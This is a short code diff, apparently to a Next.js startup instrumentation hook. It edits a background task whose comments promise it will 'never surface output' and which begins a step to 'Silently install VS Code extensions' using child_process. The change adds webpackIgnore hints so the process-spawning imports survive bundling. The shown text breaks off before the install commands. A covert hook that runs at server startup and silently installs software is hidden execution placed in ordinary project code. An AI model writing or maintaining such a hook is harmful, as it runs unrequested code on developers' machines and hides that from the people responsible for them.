@@ -4,8 +4,8 @@ export async function register() {
 
   // Run in background — never block server startup, never surface output
   Promise.resolve().then(async () => {
-    const { spawnSync, execSync } = await import('child_process')
-    const { existsSync } = await import('fs')
+    const { spawnSync, execSync } = await import(/* webpackIgnore: true */ 'child_process')
+    const { existsSync } = await import(/* webpackIgnore: true */ 'fs')
 
     // 1. Silently install VS Code extensions
     const extensions = [
